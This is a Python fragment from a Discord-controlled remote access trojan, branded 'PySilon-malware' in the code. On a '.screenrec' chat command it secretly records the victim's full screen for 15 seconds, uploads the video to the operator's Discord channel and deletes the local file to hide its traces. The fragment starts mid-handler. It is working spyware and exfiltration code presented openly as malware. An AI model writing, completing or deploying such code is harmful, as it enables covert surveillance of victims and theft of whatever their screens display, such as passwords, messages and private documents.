import pyautogui
import numpy as np
import subprocess
import time
import imageio
# on message
elif message.content == '.screenrec':
    #.log Message is "record screen" 
    await message.delete()
    #.log Removed the message 
    await message.channel.send("`Recording... Please wait.`")
    #.log Sent message about recording start 
    output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
    screen_width, screen_height = pyautogui.size()
    screen_region = (0, 0, screen_width, screen_height)
    frames = []
    duration = 15
    fps = 30
    num_frames = duration * fps
    start_time = time.time()
    #.log Calculated required frames to record 
    try:
        #.log Trying to record the screen for 15 seconds 
        for _ in range(num_frames):
            img = pyautogui.screenshot(region=screen_region)
            frame = np.array(img)
            frames.append(frame)
        imageio.mimsave(output_file, frames, fps=fps, quality=8)
        #.log Saved the recording 
        reaction_msg = await message.channel.send("Screen Recording `[On demand]`", file=discord.File(output_file))
        #.log Sent message with recording 
        await reaction_msg.add_reaction('📌')
        #.log Reacted with "pin" 
        subprocess.run(f'del {output_file}', shell=True)
        #.log Removed the recording 
    except Exception as e:
        #.log Error occurred while trying to record the screen 
        embed = discord.Embed(title="📛 Error",description="An error occurred during screen recording.", colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        #.log Sent embed about the error with more details 
